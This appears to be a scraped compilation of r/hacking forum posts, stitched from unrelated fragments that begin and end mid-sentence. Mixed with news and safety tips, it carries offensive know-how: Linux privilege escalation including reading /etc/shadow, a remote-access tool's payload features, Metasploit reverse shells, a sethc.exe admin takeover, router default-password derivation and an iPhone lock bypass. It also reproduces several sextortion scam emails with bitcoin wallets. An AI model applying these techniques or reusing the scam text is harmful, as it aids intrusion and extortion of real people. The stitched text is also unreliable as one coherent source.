usage, however, is only licit on devices you own or have permission for. This is also stated inside our terms of service. By purchasing and using OmniRAT, you obey the above."" Although the OmniRAT developer did not seem to have directly encouraged his customers to use the tool for spying on someone, late last year, he posted description and new features of his tool on an infamous hacking forum, a website which is famous among newbies for finding hacking tools in the market. On the same hacking forum, in April this year, he announced the shutdown of OmniRAT, saying ""unfortunately due to the pressure of the government and the cybercrime division OmniRAT has to be shut down. This will take immediate effect."" However, since the working of the tool does not directly rely or share collected device data with the OmniRAT server, users who already have access to the remote administration tool can still continue using it for whatever purpose they want."

Just feel like sharing because this community has been a great source for knowledge, so I'll leave some tips for beginners in Linux Privesc &amp;#x200B; I've came across several situation where I had a limited shell in a Linux environment. To perform privesc, start by searching for all the files with the [SUID](URL with the [FIND](URL command: **find / -perm -4000** This can generate some errors like ""No such file or directory"", so we can clean this up by [redirecting the output](URL stderr to the [blackhole](URL **find / -perm -4000 2&gt;/dev/null** Depending on this output, look in [GTFOBins](URL for a way to get root or to execute commands as such. &amp;#x200B; Get the /etc/passwd and /etc/shadow file. &amp;#x200B; It's not as clean as to get a root shell, but if you find that the system you're on is exploitable (maybe unpatched kernel?), you can then proceed to exploit it. Another very useful ink is the [PenTester Revershe Shell Cheat Sheet](URL Here you'll have several ways to bind a shell to a TCP port in a one-liner command. So if you find a vulnerability that allows you to execute commands, you either do a reverse shell, or just bind one to a TCP port and grab it with a netcat listener. &amp;#x200B; The last one I want to share is [Linuxprivchecker.py](URL This will run several commands and give you detailed information about the system, list users, list tools, find possible privesc exploits, check SUID/SGID files and directories and more. &amp;#x200B; This is probably nothing new to most of you, but this is aimed to beginners."

After payment, my virus and dirty screenshots with your enjoys will be self-destruct automatically.

They use GoDaddy shared hosting, and when I logged onto the server, I found that my web.config file had been altered, and there were 2 PHP files that were recently uploaded. I was able to restore the site back to it's normal functionality, but now I'm left wondering how they were able to gain access. I contacted GoDaddy, but they weren't much help, although they said the version of PHP was out of date, and they updated it. I changed the credentials to the database, and to my FTP account, but I am worried that it's not enough, and it will happen again, as they may have found a vulnerability in the code.

108,vulnerability,hacking,Logitech's M185 and other popular wireless mice are vulnerable to MouseJack attacks Hackers can control your PC from up to 100 meters away,4,b2yjup,https://www.reddit.com/r/hacking/comments/b2yjup/logitechs_m185_and_other_popular_wireless_mice/,2019-03-20 02:09:28,"Logitech sells some of the most popular gaming peripherals out there, as we've outlined multiple times in the past. Unfortunately, that can come with a few drawbacks from time to time. [URL &amp;#x200B; When security vulnerabilities crop up, the effects can be even more disastrous due to their wide impact. As discovered by security researcher David Sopas, just such a vulnerability exists in one of Logitech's most well-known wireless mice: the M185. &amp;#x200B; Though far from high-end, the M185 is reasonably sturdy, long-lasting, and affordable at around $25. As you can imagine, those three selling points have made it the mouse of choice for those who travel frequently, or simply want a more minimalist mouse for basic tasks. &amp;#x200B; Background aside, the security flaw in question reportedly makes the M185 (and a wide array of other mice) vulnerable to ""MouseJack"" keystroke injection attacks. &amp;#x200B; For the unaware, MouseJack attacks are carried out by hackers using simple, low-cost radio devices that can transmit signals to a target mouse from ""up to 100 meters away."" &amp;#x200B; The attacker can then take control of a target mouse's computer, running scripts and entering commands with minimal effort. It's important to note that not all wireless mice are affected - Bluetooth devices, for example, are apparently safe from MouseJack attacks. In Sopas' case, he hacked his own mouse and used the attack to display Windows' built-in calculator. Obviously, he wasn't keen on doing any real harm to his own system, so this was merely a proof of concept. Unfortunately, short of using a different mouse, there doesn't appear to be much you can do to secure yourself against these attacks. There might be a firmware update available for your mouse to improve security, but that's not a guarantee for every model. As such, consider this a warning if you happen to own the M185 or any other mice that are on MouseJack's [affected devices list](URL [URL &amp;#x200B;"
109,vulnerability,hacking,How to keep yourself safe and minimize the risk of being hacked.,10,b5b8nl,https://www.reddit.com/r/hacking/comments/b5b8nl/how_to_keep_yourself_safe_and_minimize_the_risk/,2019-03-26 01:18:11,"So I would like to make everyone aware that it is impossible to prevent yourself from being hacked. The only time your computer has no sort of any I/O, and the PCB is completely impossible to access then youre always vulnerable but that is impractical to do and would be useless. I will explain the way to protect yourself and why the tip will increase your security. Tip #1: Disable WiFi when youre not using it So wether youre on a laptop and using Ethernet or a mobile device using data instead of WiFi, it is always a good idea to disable the WiFi to secure your device. This is crucial because if someone wants to they can use a beacon spammer and create various common open networks to detect if your device tries to connect them, if your device does connect to them, they could possibly pull information from what youre doing on your computer and depending on how up to date your PC is then they may be able to exploit vulnerabilitys and take control of your PC over that network they have created. Tip #2: Always keep your PC up to date Okay now this is very controversial and theres many reasons why. Some people refuse to update their PC because on some operating systems they will have feature updates and these can be great and all but sometimes they bring along more possible vulnerabilities, although windows is bringing a rollback feature so we will see how that goes. One topic that any PC enthusiast or Whitehat will tell you though is to ALWAYS install security updates. They are there to help you! Tip #3: Do not use unsupported operating systems Okay so when a operating system has discontinued support then it is highly advised that you do not use it as you will not receive security updates. This is something any Blackhat will love, because youre essentially making it easy for them to exploit various vulnerabilitys. Its just unsafe practice, you should always stay up to date with the operating systems. Tip #4: Always use a VPN on a open network Okay so many of you hear it enough, and this is probably redundant but always use a VPN when using a insecure network, not a proxy either. This is because while WPA2 encrypts your data, Open networks dont so anyone who is listening to the data going back and forth between you and the router, will see everything youre doing. Some websites use HTTPS, and this will protect you but not all websites use HTTPS, so while websites like Google may protect you, some website youre using to catch up on news may not. A VPN will encrypt your data and you will be safe. Tip #5: Do not just download anything Okay so I get that sometimes you need to download applications from third party websites because whether it be that they have been discontinued and the website is offline or youre trying to get Photoshop for free (I do not support or suggest this) some applications may give you what you want, but will also install backdoors into your PC and you dont want these. These can be used to utilize your PC in a botnet attack, or to simply just steal your information. Tip #6: Always use some sort of antivirus Let me make something clear, youre not cool because youre using no antivirus and you still are virus free. Just because you use common sense doesnt mean you cant get hacked. Lets say that google gets hacked and someone modified the google homepage, now when you open google, it installs a malicious program on your PC through a vulnerability. Now whos smart for not using a Antivirus Tip #7: Never use same passwords Okay now I know its very redundant but Ill tell you again because it is very important. Its dumb to use the same password in every single account. Thats just dumb practice anyways, when a websites database gets leaked and your password is in it, hackers will try the credentials on every other site and try to see if they can find anything, now what do you do when they get in your bank account because you didnt listen? Tip #8: Use Secure passwords I know it may not be extremely easy to remember every password and it can be difficult to not forget them and Im sorry but using your daughters name with some numbers and maybe a few capitals and lowercase letters wont protect you. Attacks known as brute force can guess and I can guarantee will crack your password. Always try to include special characters like @,-, or even simply throwing a German letter in there to make it look normal meanwhile its not. Tip #9: Do not tell customer support your credentials Okay so you may get phone calls or emails from Microsoft Corporation but if they ask for your login information or anything besides maybe your email or security questions to verify your identity then they are fake, real companies will never need your password if they have higher privilege access than you. Tip #10: Encrypt your HDD/SSD This will prevent applications used for ransom ware from taking control of your files Tip #11: Just be smart Just use common sense and dont do things you wouldnt do if you were risking $1 Million. Use ethical common sense, and be smart about your decisions Now there may be many more tips but I dont have all the time in the world and many of these tips will help you gravely if you follow them correctly. I suggest and advice anyone to leave their advice and information also. If I made any mistakes feel free to correct me"

Your personal data is threatened! from: myemail but without my name and family name on it@abv.bg date:19.03.2019 10:17to: my email@abv.bg Hello! THE ACTUAL EMAIL: I have very bad news for you. 17/11/2018  on this day I hacked your OS and got full access to your account dmd\_m@abv.bg So, you can change the password, yes But my malware intercepts it every time. How I made it: In the software of the router, through which you went online, was a vulnerability. I just hacked this router and placed my malicious code on it. When you went online, my trojan was installed on the OS of your device. After that, I made a full dump of your disk (I have all your address book, history of viewing sites, all files, phone numbers and addresses of all your contacts). A month ago, I wanted to lock your device and ask for a not big amount of btc to unlock. But I looked at the sites that you regularly visit, and I was shocked by what I saw!!! Im talk you about sites for adults. I want to say  you are a BIG pervert. Your fantasy is shifted far away from the normal course! And I got an idea. I made a screenshot of the adult sites where you have fun (do you understand what it is about, huh?). After that, I made a screenshot of your joys (using the camera of your device) and glued them together. Turned out amazing! You are so spectacular! Im know that you would not like to show these screenshots to your friends, relatives or colleagues. I think $735 is a very, very small amount for my silence. Besides, I have been spying on you for so long, having spent a lot of time! Pay ONLY in Bitcoins! My BTC wallet: 1L47wHe7FXWQ6pfPTbnykdX44FxQGstFeS You do not know how to use bitcoins? Enter a query in any search engine: how to replenish btc wallet. Its extremely easy For this payment I give you two days (48 hours). As soon as this letter is opened, the timer will work. After payment, my virus and dirty screenshots with your enjoys will be self-destruct automatically. If I do not receive from you the specified amount, then your device will be locked, and all your contacts will receive a screenshots with your enjoys. I hope you understand your situation.  Do not try to find and destroy my virus! (All your data, files and screenshots is already uploaded to a remote server)  Do not try to contact me (this is not feasible, I sent you an email from your account)  Various security services will not help you; formatting a disk or destroying a device will not help, since your data is already on a remote server. P.S. You are not my single victim. so, I guarantee you that I will not disturb you again after payment! This is the word of honor hacker I also ask you to regularly update your antiviruses in the future. This way you will no longer fall into a similar situation. Do not hold evil! I just do my job. Have a nice day! &amp;#x200B; &amp;#x200B; &amp;#x200B; I normally would not give a flying ass about having my nudes or whatever being send to my contacts.

The core internals are modified, but the root filesystem structure and other internals are practically identical. I learned this from the SDK docs. I know that in the past, a single rooting vulnerability was disclosed by a group of individuals known as Exploiteers. It gave you persistent root access on specific models of the Roku, and non persistent root shell access to any other. I tried using that method, but with no luck. All it did was clear the text field. I am wondering if there have been any developed tools or even any interest in hacking such a device after that one release. Oh, and if anyone is asking why I would want to hack a Roku, its because Im curious as to what I could break. Thanks!"

I suspect an issue because it is supposed to download your file when you retrieve it, but with certain file types (html, png, etc.) It displays in-browser. This could just be due to not properly setting the Content-Disposition header, but I would like to investigate that more. &amp;#x200B; The files in question are being stored on a network drive (H:) and all users have access to their own files. I can access this drive in windows from computers that are on that network. There is some file sanitizing, for example it doesn't allow quotes, and it blocks certain file extensions (seemingly without purpose, it blocks .txt and .zip files too). My suspicion is they are somehow reading the file directly into the browser from the network drive without any special headers, which would explain why even though the webpages are .jsp extension, .jsp files output as type text/plain.

Dear user of live.co.uk! I am a spyware software developer. Your account has been hacked by me in the summer of 2018. I understand that it is hard to believe, but here is my evidence: - I sent you this email from your account. - Password from account (my email here) Similar password here to the one I've used (on moment of hack). The hacking was carried out using a hardware vulnerability through which you went online (Cisco router, vulnerability CVE-2018-0296). I went around the security system in the router, installed an exploit there. When you went online, my exploit downloaded my malicious code (rootkit) to your device. This is driver software, I constantly updated it, so your antivirus is silent all time. Since then I have been following you (I can connect to your device via the VNC protocol). That is, I can see absolutely everything that you do, view and download your files and any data to yourself. I also have access to the camera on your device, and I periodically take photos and videos with you. At the moment, I have harvested a solid dirt... on you... I saved all your email and chats from your messangers. I also saved the entire history of the sites you visit. I note that it is useless to change the passwords. My malware update passwords from your accounts every times. I know what you like hard funs (adult sites). Oh, yes .. I'm know your secret life, which you are hiding from everyone. Oh my God, what are your like... I saw THIS ... Oh, you dirty naughty person ... :) took photos and videos of your most passionate funs with adult content, and synchronized them in real time with the image of your camera. Believe it turned out very high quality! So, to the business! I'm sure you don't want to show these files and visiting history to all your contacts. Transfer $848 to my Bitcoin cryptocurrency wallet: 1GXazHVQUdJEtpe62UFozFibPa8ToDoUn3 Just copy and paste the wallet number when transferring. If you do not know how to do this - ask Google. My system automatically recognizes the translation. As soon as the specified amount is received, all your data will be destroyed from my server, and the rootkit will be automatically removed from your system. Do not worry, I really will delete everything, since I am 'working' with many people who have fallen into your position. You will only have to inform your provider about the vulnerabilities in the router so that other hackers will not use it. Since opening this letter you have 48 hours. If funds not will be received, after the specified time has elapsed, the disk of your device will be formatted, and from my server will automatically send email and sms to all your contacts with compromising material. I advise you to remain prudent and not engage in nonsense (all files on my server). Good luck! Is this real or not, quite concerned to be honest and don't know what to do. Any help would be appreciated. "

A month ago, I wanted to lock your device and ask for a not big amount of btc to unlock. But I looked at the sites that you regularly visit, and I was shocked by what I saw!!! I'm talk you about sites for adults. I want to say - you are a BIG pervert. Your fantasy is shifted far away from the normal course! And I got an idea.... I made a screenshot of the adult sites where you have fun (do you understand what it is about, huh?). After that, I made a screenshot of your joys (using the camera of your device) and glued them together. Turned out amazing! You are so spectacular! I'm know that you would not like to show these screenshots to your friends, relatives or colleagues. I think $711 is a very, very small amount for my silence. Besides, I have been spying on you for so long, having spent a lot of time! Pay ONLY in Bitcoins! My BTC wallet: 182PJESsEWbuJ8PEgfM58p64jbok3i1gNU You do not know how to use bitcoins? Enter a query in any search engine: ""how to replenish btc wallet"". It's extremely easy For this payment I give you two days (48 hours). As soon as this letter is opened, the timer will work. After payment, my virus and dirty screenshots with your enjoys will be self-destruct automatically. If I do not receive from you the specified amount, then your device will be locked, and all your contacts will receive a screenshots with your ""enjoys"". I hope you understand your situation. - Do not try to find and destroy my virus! (All your data, files and screenshots is already uploaded to a remote server) - Do not try to contact me (this is not feasible, I sent you an email from your account) - Various security services will not help you; formatting a disk or destroying a device will not help, since your data is already on a remote server. P.S. You are not my single victim. so, I guarantee you that I will not disturb you again after payment! This is the word of honor hacker I also ask you to regularly update your antiviruses in the future. This way you will no longer fall into a similar situation. Do not hold evil! I just do my job. Good luck. Now I know the screenshot threat is BS because I honestly don't look at anything weird, maybe a few weird Reddit posts but nothing I don't care if people see. But has anyone ran across this before? "

The issue here is that the way it was exploited was different than what I expected and I cant figure out how they did it. I want to know because I think its a pretty good learning opportunity. I'm not sure if there was some other vulnerability, if they were somehow able to use the XSS to do this, or if the hosting itself got hacked. **The site** The gist of the site is that it is a clone of mailinator that allows the user to make up and email address on the fly so they can receive junk mail. The site is mailspire.com , the intentional vulnerability was that I made it blindly trust html from the incoming email making it vulnerable to reflected XSS. **What happened** They were somehow able to edit the html file of the main index page.

It gives you a command line session with extra functionality between you and a target machine. EggShell gives you the power and convenience of uploading/downloading files, tab completion, taking pictures, location tracking, shell command execution, persistence, escalating privileges, password retrieval, and much more. This is project is a proof of concept, intended for use on machines you own. ## Getting Started * Requires python 2.7 ### macOS/Linux Installation # [Installation Guide](URL Creating Payloads Eggshell payloads are executed on the target machine. The payload first sends over instructions for getting and sending back device details to our server and then chooses the appropriate executable to establish a secure remote control session. ### bash Selecting bash from the payload menu will give us a 1 liner that establishes an eggshell session upon execution on the target machine ### teensy macOS (USB injection) Teensy is a USB development board that can be programmed with the Arduino ide. It emulates usb keyboard strokes extremely fast and can inject the EggShell payload just in a few seconds. Selecting teensy will give us an arduino based payload for the teensy board. After uploading to the teensy, we can use the device to plug into a macOS usb port. Once connected to a computer, it will automatically emulate the keystrokes needed to execute a payload. ## Interacting with a session After a session is established, we can execute commands on that device through the EggShell command line interface. We can show all the available commands by typing ""help"" ### Tab Completion Similar to most command line interfaces, EggShell supports tab completion. When you start typing the path to a directory or filename, we can complete the rest of the path using the tab key. ## Multihandler The Multihandler option lets us handle multiple sessions. We can choose to interact with different devices while listening for new connections in the background. Similar to the session interface, we can type ""help"" to show Multihandler commands ## Featured Featured in EverythingApplePro's video demonstrating an iOS 9.3.3 Webkit vulnerability used to run EggShell ## Special Thanks * Linus Yang / Ryley Angus for the iOS Python package * AlessandroZ for LaZagne ## DISCLAMER By using EggShell, you agree to the GNU General Public License v2.0 included in the repository. For more details at [URL Using EggShell for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws.

Insecure implementations of SSL/TLS are subject to different types of Man in The Middle (MiTM) attacks, which ultimately makes the communication between the two parties vulnerable to eavesdropping and hijacking attacks, thereby vio\-lating condentiality and integrity of the exchanged information. This paper aims to support developers in detecting insecureSSL/TLS implementation in their codes by utilizing a low\-cost cross\-language static analysis tool called PMD. In the end, two insecure implementations of SSL/TLS have been identied, and subsequently a new PMD rule set is created. This rule set consists of three rules for addressing: hostname, validation, vulnerability and certicate validation vulnerability. The rules have been evaluated over 1,517 code snippets obtained from Stack Overow, and the results show that 71&amp;#37; of the code snippets contain insecureSSL/TLS patterns. The detection rate of our approach is 100&amp;#37;, while it detects 165 violations inside the vulnerable code snippets in total.Read: [URL"

I cross checked it using Nmap and Nikto (URL ALLOWED HTTP Method were the same as mentioned above.

I researched to exploit it and found Cross-Site Trace Attack - In this attack, attacker grabs the cookies of administrator from exploiting this vulnerability. Read here.

My friend was in Uzbekistan when he gave me a call thru imo app. For those who don't know, imo is a video/voice/text application similar to Facebook or Viber. It requires internet connection for voice calls. Apparently my friend was connected to Wifi at a local internet cafe when he called me. We talked and then after about 3-4 hours I get an email from Gmail that says ""Someone has your password"". I panic and reset my gmail password. Google shows that someone tried to sign-in to my Gmail in Uzbekistan. Since it was overseas, Google flagged it as suspicious activity and didn't let the hacker to login (God bless Google!). Now I'm just mind blown how this is even possible. I work in IT and always security aware. My gmail password has letters, numbers and non-alphabet characters so there is no way anyone could guess the password. In my opinion, it is either: 1. imo has some kind of security vulnerability 2. you can hack iPhones thru Wifi somehow But we were not on the same WIFI network so I'm not sure how it can be possible. Any thoughts? Edit: My phone is iPhone 6 with IOS 11 and my friend is on iPhone 7 also IOS 11. Edit 2: I have Gmail app and obviously I'm always logged in there.

Ive been a hackerone user for a while now, and a while ago I found a vulnerability that I hadnt ever seen demonstrated exactly on any other articles or websites, so I decided to do a little write-up on it here. Report link (It is disclosed): URL So I started by looking at their crossdomain.xml file on their main site, starbucks.com. As many of you know, this file controls any websites cross domain policies regarding HTTP requests, and overrides Secure Origin Policy (SOP). While looking through here, I noticed for a few of the websites it referenced, it referenced all of their sub domains with an asterisk *.website.com I decided to then find all the subdomain for these referenced sites, and eventually found one that was an unclaimed bucket. I didnt take it over since it was a different companies website, but asked in my report for them to notify that company. Anyway, since I had control of this subdomain now, I wouldve been able to send and receive completely unrestricted HTTP requests through their site, which could be used harmfully regarding people logging in and such. Also, their crossdomain setup allowed me to use any headers on the requests which only makes it worse. The power that I got from that subdomain wouldve been the same as if they had just made their crossdomain setup allow access from any websites, which wouldnt be secure for them. Overall I thought this was a bit more unique of a vulnerability or at least a more unique way to take advantage of this issue. If you want more information just ask in the comments, but unfortunately I cannot provide the other companys name, as that was not disclosed."

I have observed very strange behaviour on all my devices for some time and I have reason to believe that I have RATs installed on my devices. I would like to get some information about how sophisticated an attacker has to be in order to do the things I believe were done to me and whether those things are actually technologically feasible and I'm not just being paranoid. While I think it's not completely impossible that I'm paranoid, I'd say it's rather unlikely since I would say I'm generally a fairly well functioning human and don't have any mental problems. I used to have a router that had WPS, as far as I know that is a serious security issue. I have a Macbook, an Android phone and an IPod Touch. I have noticed things such as files that were deleted on my macbook that I definitely did not delete, I have seen my phone and my Ipod being automatically controlled, opening different sites, opening files and typing something into my browser. I tried resetting my phone and Ipod, I erased the hard drive on my Macbook, but I still observe the same issues. I have read that RATs can be installed in the EFI firmware on Macbooks, so that any reset of the harddrive is meaningless. I have also read that RATs can easily override the default re-installation files on android phones, so that a factory reset also reinstalls the RAT. I have a couple of questions: 1. Can someone tell me how sophisticated an attacker has to be in order to gain root access to a Macbook when on the same network? 2. Is it possible that RATs are transfered between devices? So lets say I plug in a clean Ipod to my Macbook, is it possible that this will infect the device? 3. I currently don't have Wifi at home, my router is still there though, not turned off, but it's not registered with any ISP anymore. Can the router, which is not registered still send out data? Is it possible that the RAT somehow automatically connects to a network that is in proximity? 4. I recently bought an android tablet, which I did not plug into my Macbook or connect in any way to my other devices (no tethering over my phone e.g.), I have used the network of my university, for which I have to use my account in order to install a certificate which lets me use eduroam (this is the only way I could think of that would potentially be a vulnerability). I have also observed the same exact behaviour as on my phone and ipod. To me it seems completely impossible that the device could have theoretically been infected and that's actually the biggest argument for me that I think this might not actually really happen. Is there any way that the tablet could actually have been infected over my router or over the university network while registering the device there? edit: formatting"

Device does not have a wireless adapter compatible for injection so Im somewhat limited on its capabilities. Currently I have a script designed to run and Nmap scan on active devices on the network, determine what services are running, if theres any known vulnerabilities, and then output the results to an xml file It then takes the xml file and feeds it to a program available on GitHub called Brutespray which will try and brute the services it found running. It will output any successes and email the results to me in a text file. It will then take the same file and feed it to another program called ChangeMe which will check the services for any default creds. Again, if any are found it will output the results to a text file and email them to me. Finally, I run Sn1per on the active devices which is a pretty thorough all-in-one for recon, enumeration, brute forcing, and vulnerability checking. Again, this will then output the results to an HTML file and forward it via email. So far this has proved pretty successful, and being that its a single script controlling all this, it is very easy to execute and let it run its course while I can sort through the results after its finished. Any recommendations you guys would have on ways to improve this or alter this? Thanks in advancd"

232,vulnerability,hacking,A Decade Old Unix/Linux/BSD Root Privilege-Escalation Bug Discovered,1,6ihreb,https://www.reddit.com/r/hacking/comments/6ihreb/a_decade_old_unixlinuxbsd_root/,2017-06-21 09:04:31,"The explanation is simple: Each program uses a special memory region called the stack, which is used to store short-term data. It expands and contracts automatically during the execution of any program, depending upon the needs of that program. According to researchers at Qualys, who discovered and reported this bug, a malicious program can attempt to use more memory space than available on the stack, which could overflow the memory, causing it to collide or clash with nearby memory regions and overwrite their content. Moreover, the Stack Clash exploit can also bypass the stack guard-page, a memory management protection introduced in 2010, after this issue was exploited in 2005 and 2010. ""Unfortunately, a stack guard-page of a few kilobytes is insufficient: if the stack-pointer 'jumps' over the guard-pageif it moves from the stack into another memory region without accessing the guard-pagethen no page-fault exception is raised and the stack extends into the other memory region,"" an advisory published by Qualys read. The Stack Clash vulnerability requires local access to the vulnerable system for exploitation, but researchers said it could be exploited remotely depending upon the applications. For example, a malicious customer with low privilege account with a web hosting company, running vulnerable system, could exploit this vulnerability to gain control over other websites running on the same server, as well as remotely gain root access and execute malicious code directly. Just yesterday, we reported that how a web hosting company fell victim to a similar attack used to infect Linux servers with a ransomware malware, causing the company to pay more than $1 Million in ransom to get back their files. Attackers can also combine the Stack Clash bug with other critical vulnerabilities, like the Sudo vulnerability recently patched, and then run arbitrary code with the highest privileges, said Qualys researchers. 7 Proof-of-Concept Exploits The researchers said they were able to develop seven exploits and seven proofs of concept (PoCs) for the Stack Clash vulnerability, which works on Linux, OpenBSD, NetBSD, FreeBSD and Solaris on 32-bit and 64-bit x86 processors. However, the researchers have not yet published the exploits and proofs of concept, giving users and admins enough time to patch their systems before they go into the Stack Clash exploits public. The PoCs follow four steps, which include 'Clashing' the stack with another memory region, running the stack pointer to the stacks start, 'Jumping' over the stack guard-page and 'Smashing' the stack or the other memory regions. Among distros and systems affected by Stack Clash include: Sudo on Debian, Ubuntu, and CentOS ld.so and most SUID-root binaries on Debian, Ubuntu, Fedora, and CentOS Exim on Debian rsh on Solaris 11 and so on Red Hat Enterprise The company also believes that other operating systems, including Microsoft's Windows, Apple's OS X/macOS and Google's Linux-based Android OS could also be vulnerable to Stack Clash, though it is yet to be confirmed. **Patch Available; Update Now** Many affected vendors have already issued security patches for the bug, so users and administrators are advised to install patches a soon as possible. If security patches from your vendor are yet to be released, you can reboot your systems or can manually apply stack limits to local users' applications. Simply, set the hard RLIMIT STACK and RLIMIT_AS of local users and remote services to a low value. It is also recommended to recompile all userland code (ld.so, libraries, binaries) with the fstack-check feature. This would prevent the stack pointer from moving into another memory region without accessing the stack guard-page and would kill Stack Clash dead. "

Another approach would be to try and exploit the machine's web application (if there is on) since there are few web attack vectors that could lead to RCE ( file upload, command injection and SQLi). Finally, we could try to brute force the credentials for the remote access services such as Telnet and SSH, Now, my question is, did I missed anything?

Those experts who specialize in search of vulnerabilities in software code can use the PVS-Studio analyzer for free in their research. This will, in its turn, make our tool more popular if it succeeds in finding vulnerabilities. PVS-Studio can check projects written in C and C++. It all started with the open letter ""[PVS-Studio Team Willing to Work on Improving Tizen Project](URL with which we intended to attract Samsung Electronics' attention. Samsung cares about reliability and security of the Tizen OS and carries out various kinds of research in this area. For example, they [invested](URL over $10 million in Svace static analyzer developed in the Institute for System Programming of the Russian Academy of Science. So, we thought that the Tizen developers would probably find PVS-Studio analyzer useful as well since it managed to detect bugs in their project. After that we were contacted by Amihai Neiderman ([@AAAAAAmihai](URL who showed interest in PVS-Studio's capabilities. Coincidentally, he gave a conference talk about vulnerabilities in the Tizen OS ([Breaking Tizen](URL just a month ago. We exchanged a few emails, and then our company granted Amihai Neiderman a PVS-Studio license to use in his further research of vulnerability detection. It's unknown if he will be lucky to find any issues using our analyzer, but why not give it a try? If he is, then everyone will benefit from it. We gave Amihai Neiderman a new tool capable of detecting suspicious code where vulnerabilities may hide. If he succeeds and finds such issues, it will be a nice opportunity for him to mention PVS-Studio in his next conference talk. And for us it will be a nice opportunity to get additional promotion. It was at this point that a good idea occurred to us. It's strange that it hadn't happen earlier, but that's just the way of many good ideas :). We realized that we should start cooperating with other experts studying vulnerabilities, too. So, if you happen to be a public expert in security and specialize in vulnerability detection, you are welcome to email us to get your PVS-Studio license. We will help you with scanning various projects and provide user support. If you manage to find issues using our tool, we'll appreciate you mentioning it in your articles and talks. Those willing to get the license and support will need to prove that they deal with software security and are engaged in public activity, for example, writing articles. Anyway, these points will be discussed during our communication. If you are interested, please email us at support [@] viva64.com. Far not all PVS-Studio diagnostics detect security related errors. For example, the [V665](URL warning is hardly going to be useful if you look for vulnerabilities. Luckily, such diagnostics can be turned off to leave only relevant warnings. As I already said, you can also count on our support if you have any questions. Note. We haven't positioned our analyzer as a tool for detecting vulnerabilities before. We only discussed regular bugs in our [articles](URL Now we want programmers to view PVS-Studio not only as a tool for detecting typos and other mistakes, but also as a tool that helps prevent multiple vulnerabilities. Many errors detected by PVS-Studio analyzer fall under CWE classification ([example](URL In certain circumstances, CWE issues may turn to CVE ones, so using PVS-Studio allows you not only to eliminate bugs from your code, thus reducing the development cost, but also prevent lots of vulnerabilities.

The attack has also reportedly hit a Spanish telecommunications company and a Russian cellphone operator. Security experts say the strain of ransomware being used, called the Wanna Decryptor, is exploiting a vulnerability in Microsoft Windows that was leaked last month by an anonymous hacker group calling itself the Shadow Brokers. The group claimed it had stolen the exploits it released from the US National Security Agency. Ransomware is a form of malware that encrypts a computers files and displays a message to the user, saying it will decrypt the files for a payment, typically via bitcoin. The message displaying on NHS computers and others has been circulated in photos on social media, and it includes instructions to send $300 or $600 to a bitcoin address. Those bitcoin addresses are publicly accessible, and you can view their associated wallets as victims send the hackers money in hopes of regaining access to their files. Note that these addresses have been collected from photos on social media, and although theyve widely been accepted by experts as genuine, Quartz has not seen the affected computers firsthand. Here are three of those bitcoin wallets, and their associated transactions: Wallet 1 (12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw) This wallet has received 8 payments totaling 1.33236738 in bitcoin ($2,274.56 USD) at the time of this posts publication.

Theoretically it can sniff the password and write it in a special place, on the USB drive so that the attacker can decrypt the drive if they find it. It is also possible that the virus could make it's self permanent using existing hard drive. To protect against this attack and also the first one, the flash drive must be encrypted twice on Tails after booting twice. (first encryption erases any potential virus, the second provides secure encryption of the entire drive) .

It was in a water puddle so i let it dry for a day before I could power it on. Charged it. Waited 2 days for someone to call the number but eventually the owner deactivated the simcard. I would have given it back to them if they called but oh well :/ So! I decided to factory reset it, to my surprise iPhones security has gotten better over the years. I was greated with a ""Please sign-in with the AppleID of the previously activated iCloud"" message. I looked online and saw a thing called DoulCi, none of it worked except for this one: URL Well...this partially works, it allows you to bypass the iTunes lock, but it's missing an actual activation. #So... the exploit: Doesn't do anything really but it's definitely an (afaik) undiscovered vulnerability. Here's how you do. - In the start-up mode where it asks you to connect to a wifi/itunes and login to your AppleID, hold and release the home button and press emergency call. - Put in the deactivated SIM. - Call 112 and keep mashing the ""+ contact"" button. - Just keep doing really quickly, maybe 5-6 time by pressing as fast as you can both the ""Call Back"" and ""+"" button. - Eventually, you're allowed to edit contacts, use the camera, view the camera roll, view some settings. Now i've tried a bunch of stuff, but it seems that a lot of service aren't yet loaded on the iPhone. Had I discovered this before doing the factory reset i'm quite sure I could have bypassed everything. The furthest I can get is pressing on ""Share Contact"" and then ""Share by message"" will actually bring you on the Home screen. But then nothing is loaded and you're stuck. I'm writing this wondering if any of you have any ideas about continuing the exploit. "

The default password for these devices is a combination of the SSID and MAC address. For example, let's say your SSID is DG167ABCD and your MAC address is C0:FF:EE:C0:FF:EE. The password takes the 4th and 5th hexadecimal value (C0:FF) and places it in the SSID after the 7th character. So the pass word in this example would be DG167ABC0FFCD. So change your damn default SSID and password. And change the routers default username and pw as well. Everyone's router I've checked (with permission) still had admin and password as their default.

Irrelevant back story/sperging has been put in italics. ##########################Sperge####################################### *I am a 2nd year 6th form student looking into taking computer science next year. I will decide which direction to take it in form there as all the course I have looked share the same first year course.* *So our old system admin got fired for being shit. And the new one is my form tutor and we spoke about the old system and the fact that I obtained admin privileges with five different methods.* I never mentioned the methods I used. *In the spirit of red team and blue team he has challenged me to gain any sort of admin privileges or gain access to network drives. He says through his own pen-testing he had done it but considering he is the one that set it up I'm not surprised. I have been given permission for this with the only rules being that I am not to stress test anything(not that I would) or be reckless with with brute force during school hours.* ##########################Sperge###################################### Is a predominantly windows 7 network. All users have been moved to one domain(previously on 4). Given a tip that at one point a set of users with personal machines on the network with usernames with a different layout have admin credentials lying around on them some where. I am yet to find the layout or original domain name for these users tho.*(He says that this could lead to a breach and is currently sorting it out. So is best not to bother going down that root.)* Methods used in the past and have been tried since the complete system change: **1**.Metasploit Power shell into cmd **2.**Metasploit payload(reverse tcp Meterpreter) **3.**IE browser exploit (again reverse tcp Meterpreter) **4.**Python keylogger(no trace of an admin logging in. Can't spread this method effectively to get a PC with an admin using it. In addition I assume most work is done by VM and remote connect now) **5.**Copying ""cmd.exe"" to ""sethc.exe"" through Linux. Using system32's local admin privileges to creating a user then appending it to the Administrators localgroup(localgroup administrators has a password on it and each local admin after that). From testing done yesterday I conclude that all the above methods bar keylogging with python have been nullified. IE browser exploit(AV), Metasploit payload(Programs on whitelist not blacklist), Metasploit Power shell into cmd(cmd requires elevation to operate) I know It's cheating to ask for help but i really am stuck. My only other thought is combining methods 1 and 5 using an Arduino Nano set up to act like a rubber ducky to get the power shell connection going I'm just not sure it would achieve much for the large amount of work that would have to go into that method. **TL;DR: Anything aside from 1-5 can you see that I have missed?

